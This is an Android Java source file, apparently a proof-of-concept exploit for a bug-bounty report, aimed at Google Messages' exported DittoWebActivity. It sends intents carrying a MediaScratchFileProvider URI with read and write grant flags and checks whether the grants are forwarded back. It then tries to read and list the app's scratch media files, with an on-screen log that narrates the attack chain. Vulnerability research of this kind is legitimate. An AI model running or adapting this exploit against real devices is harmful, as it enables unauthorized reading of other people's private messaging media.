package com.vrppoc;

import android.app.Activity;
import android.content.ClipData;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.InputStream;

public class DittoTest extends Activity {
    private static final String TAG = "DITTO_TEST";
    private static final int RC_DITTO = 100;
    private TextView tv;
    private StringBuilder sb = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(20, 40, 20, 20);

        Button btnTest = new Button(this);
        btnTest.setText("Launch DittoWebActivity with URI Grant");
        btnTest.setOnClickListener(v -> launchDittoTest());
        root.addView(btnTest);

        Button btnTest2 = new Button(this);
        btnTest2.setText("Launch with FLAG_GRANT_WRITE too");
        btnTest2.setOnClickListener(v -> launchDittoTestWrite());
        root.addView(btnTest2);

        ScrollView scroll = new ScrollView(this);
        tv = new TextView(this);
        tv.setPadding(20, 20, 20, 20);
        tv.setTextSize(11f);
        scroll.addView(tv);
        root.addView(scroll);

        setContentView(root);

        log("=== DittoWebActivity URI Grant Forwarding Test ===");
        log("Target: Google Messages DittoWebActivity (exported)");
        log("Provider: MediaScratchFileProvider (exported, grantUriPermissions=true)");
        log("");
        log("Attack chain:");
        log("1. PoC sends startActivityForResult to DittoWebActivity");
        log("2. Intent carries MediaScratchFileProvider URI + FLAG_GRANT_READ_URI_PERMISSION");
        log("3. If DittoWebActivity calls setResult(-1, getIntent()) and finish(),");
        log("   the URI grant gets forwarded back to PoC");
        log("4. PoC can then read Messages' scratch media files");
        log("");
        log("Press button to start test...");
    }

    private void launchDittoTest() {
        log("\n--- Starting DittoWebActivity test ---");

        Uri scratchUri = Uri.parse("content://com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider/scratch_space/test");

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.google.android.apps.messaging",
            "com.google.android.apps.messaging.dittosatellite.impl.DittoWebActivity"
        ));
        intent.setData(scratchUri);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        log("Intent: " + intent);
        log("Data URI: " + scratchUri);
        log("Flags: FLAG_GRANT_READ_URI_PERMISSION");

        try {
            startActivityForResult(intent, RC_DITTO);
            log("Activity launched successfully! Waiting for result...");
        } catch (Exception e) {
            log("ERROR launching: " + e.getMessage());
        }
    }

    private void launchDittoTestWrite() {
        log("\n--- Starting DittoWebActivity test (READ+WRITE) ---");

        Uri scratchUri = Uri.parse("content://com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider/scratch_space/test");

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.google.android.apps.messaging",
            "com.google.android.apps.messaging.dittosatellite.impl.DittoWebActivity"
        ));
        intent.setData(scratchUri);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

        log("Intent: " + intent);
        log("Flags: FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION");

        try {
            startActivityForResult(intent, RC_DITTO + 1);
            log("Activity launched successfully! Waiting for result...");
        } catch (Exception e) {
            log("ERROR launching: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        log("\n=== onActivityResult ===");
        log("requestCode: " + requestCode);
        log("resultCode: " + resultCode + (resultCode == RESULT_OK ? " (RESULT_OK)" : resultCode == RESULT_CANCELED ? " (RESULT_CANCELED)" : ""));

        if (data != null) {
            log("data URI: " + data.getData());
            log("data flags: 0x" + Integer.toHexString(data.getFlags()));
            log("data extras: " + (data.getExtras() != null ? data.getExtras().keySet() : "null"));

            if (data.getClipData() != null) {
                ClipData clip = data.getClipData();
                log("ClipData items: " + clip.getItemCount());
                for (int i = 0; i < clip.getItemCount(); i++) {
                    log("  ClipData[" + i + "] URI: " + clip.getItemAt(i).getUri());
                }
            }

            if (data.getData() != null) {
                log("\n--- Attempting to read returned URI ---");
                tryReadUri(data.getData());
            }
        } else {
            log("data: null (no intent returned)");
        }

        if (resultCode == RESULT_OK) {
            log("\n*** RESULT_OK received! ***");
            log("If URI grants were forwarded, this is a vulnerability!");
            log("The setResult(-1, getIntent()) pattern forwarded our URI grants.");

            Uri scratchUri = Uri.parse("content://com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider/scratch_space/test");
            log("\n--- Trying to read MediaScratchFileProvider directly ---");
            tryReadUri(scratchUri);

            log("\n--- Trying to list scratch_space directory ---");
            tryQueryUri(Uri.parse("content://com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider/scratch_space/"));
        }
    }

    private void tryReadUri(Uri uri) {
        try {
            ContentResolver cr = getContentResolver();
            InputStream is = cr.openInputStream(uri);
            if (is != null) {
                byte[] buf = new byte[1024];
                int read = is.read(buf);
                is.close();
                log("READ SUCCESS! Got " + read + " bytes from " + uri);
                if (read > 0) {
                    log("First bytes (hex): " + bytesToHex(buf, Math.min(read, 64)));
                }
            } else {
                log("openInputStream returned null for " + uri);
            }
        } catch (SecurityException e) {
            log("SecurityException reading " + uri + ": " + e.getMessage());
        } catch (Exception e) {
            log("Error reading " + uri + ": " + e.getMessage());
        }
    }

    private void tryQueryUri(Uri uri) {
        try {
            ContentResolver cr = getContentResolver();
            android.database.Cursor c = cr.query(uri, null, null, null, null);
            if (c != null) {
                log("QUERY SUCCESS! " + c.getCount() + " rows, columns: " + java.util.Arrays.toString(c.getColumnNames()));
                while (c.moveToNext() && c.getPosition() < 10) {
                    StringBuilder row = new StringBuilder("  Row " + c.getPosition() + ": ");
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        try {
                            row.append(c.getColumnName(i)).append("=").append(c.getString(i)).append(", ");
                        } catch (Exception e) {
                            row.append(c.getColumnName(i)).append("=[error], ");
                        }
                    }
                    log(row.toString());
                }
                c.close();
            } else {
                log("query returned null for " + uri);
            }
        } catch (SecurityException e) {
            log("SecurityException querying " + uri + ": " + e.getMessage());
        } catch (Exception e) {
            log("Error querying " + uri + ": " + e.getMessage());
        }
    }

    private static String bytesToHex(byte[] bytes, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x", bytes[i] & 0xff));
        }
        return sb.toString();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        sb.append(msg).append("\n");
        if (tv != null) {
            tv.setText(sb.toString());
        }
    }
}
